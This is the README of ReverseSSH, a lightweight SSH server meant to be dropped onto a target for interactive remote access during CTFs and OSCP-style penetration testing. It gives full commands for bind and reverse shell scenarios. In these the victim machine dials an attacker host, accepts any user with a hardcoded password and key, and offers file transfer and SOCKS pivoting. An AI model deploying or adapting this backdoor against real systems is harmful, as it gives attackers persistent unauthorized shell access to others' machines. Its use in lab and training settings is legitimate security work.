# ReverseSSH

**A statically-linked ssh server with a reverse connection feature for simple yet powerful remote access. Most useful during HackTheBox challenges, CTFs or similar.**

Has been developed and was extensively used during OSCP exam preparation.

**[Get the latest Release](https://github.com/Fahrj/reverse-ssh/releases/latest)**


## Features

Catching a reverse shell with _netcat_ is cool, sure, but who hasn't accidentally closed a reverse shell with a keyboard interrupt due to muscle memory?
Besides their fragility, such shells are also often missing convenience features such as fully interactive access, TAB-completion or history.

Instead you can go the way to simply deploy a **lightweight ssh server** (<1.5MB) onto the target and use additional commodities such as **file transfer** and **port forwarding**!

ReverseSSH tries to bridge the gap between initial foothold on a target and full local privilege escalation.
Its main strengths are the following:

* **Fully interactive shell access** (A fully interactive powershell on windows relies on the [Windows Pseudo Console ConPTY](https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/) and thus requires at least `Win10 Build 17763`. Before that, it still works, but you only get a somewhat interactive, generic reverse shell.)
* **File transfer via sftp**
* **Local / remote / dynamic port forwarding**
* Supports **Unix** and **Windows** operating systems


## Requirements

Simply executing the provided binaries only relies on [golang system requirements](https://github.com/golang/go/wiki/MinimumRequirements#operating-systems).

In short:

* **Linux**: kernel version 2.6.23 and higher
* **Windows**: Windows Server 2008R2 and higher or Windows 7 and higher

Compiling additionally requires the following:

* golang version 1.15
* optionally `upx` for compression (e.g. `apt install upx-ucl`)


## Usage

```shell
reverseSSH v1.0.0-alpha  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

Usage: reverse-ssh [options] [<user>@]<target>

Examples:
  Bind:
        reverse-ssh
        reverse-ssh -v -l :4444
  Reverse:
        reverse-ssh -p 31337 192.168.0.1
        reverse-ssh -v -b 0 kali@192.168.0.2

Options:
        -s, Shell to use for incoming connections, e.g. /bin/bash; no effect for windows (default: /bin/bash)
        -l, Bind scenario only: listen at this address:port (default: :31337)
        -p, Reverse scenario only: ssh port at home (default: 22)
        -b, Reverse scenario only: bind to this port after dialling home (default: 8888)
        -v, Emit log output

<target>
        Optional target which enables the reverse scenario. Can be prepended with
        <user>@ to authenticate as a different user than 'reverse' while dialling home.

Credentials:
        Accepting all incoming connections from any user with either of the following:
         * Password "letmeinbrudipls"
         * PubKey   "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlbJwr+ueQ0gojy4QWr2sUWcNC/Y9eV9RdY3PLO7Bk/ Brudi"
```

Once `reverse-ssh` is running, you can connect with any username and the default password `letmeinbrudipls`, the ssh key or whatever you specified during compilation.
After all, it is just an ssh server:

```shell
# Simple, interactive shell access
$ssh -p <RPORT> <RHOST>

# Full-fledged file transfers
$sftp -P <RPORT> <RHOST>

# Dynamic port forwarding as SOCKS proxy
$ssh -p <RPORT> -D 9050 <RHOST>
```

For even more convenience, add the following to your `~/.ssh/config`, copy the [ssh private key](id_reverse-ssh) to `~/.ssh/` and simply call `ssh target` or `sftp target` afterwards:

```shell
Host target
        Hostname 127.0.0.1
        Port 8888
        IdentityFile ~/.ssh/id_reverse-ssh
        IdentitiesOnly yes
        StrictHostKeyChecking no
        UserKnownHostsFile /dev/null
```

### Simple bind shell scenario

```shell
# Victim
$./reverse-ssh

# Attacker (default password: letmeinbrudipls)
$ssh -p 31337 <LHOST>
```

### Simple reverse shell scenario

```shell
# On attacker (get ready to catch the incoming request;
# can be omitted if you already have an ssh daemon running, e.g. OpenSSH)
attacker$./reverse-ssh -l :<LPORT>

# On victim
victim$./reverse-ssh -p <LPORT> <LHOST>
# or in case of an ssh daemon listening at port 22 with user/pass authentication
victim$./reverse-ssh <USER>@<LHOST>

# On attacker (default password: letmeinbrudipls)
attacker$ssh -p 8888 127.0.0.1
# or with ssh config from above
attacker$ssh target
```

In the end it's plain ssh, so you could catch the remote port forwarding call coming from the victim's machine with your openssh daemon listening on port 22.
Just prepend `<USER>@` and provide the password once asked to do so.
Dialling home currently is password only, because I didn't feel like baking a private key in there as well yet...


## Build instructions

Make sure to install the above requirements such as golang in a matching version and set it up correctly.
Afterwards, you can compile with `make`, which will create static binaries in `bin`.
Use `make compressed` to pack the binaries with upx to further reduce their size.

```shell
$make

# or to additionally created binaries packed with upx
$make compressed
```

You can also specify a different default shell (`RS_SHELL`), a personalized password (`RS_PASS`) or an authorized key (`RS_PUB`) when compiling:

```shell
$ssh-keygen -t ed25519 -f id_reverse-ssh

$RS_SHELL="/bin/sh" RS_PASS="secret" RS_PUB="$(cat id_reverse-ssh.pub)" make compressed
```

## Contribute

Is a mind-blowing feature missing? Anything not working as intended?

**Create an issue or pull request!**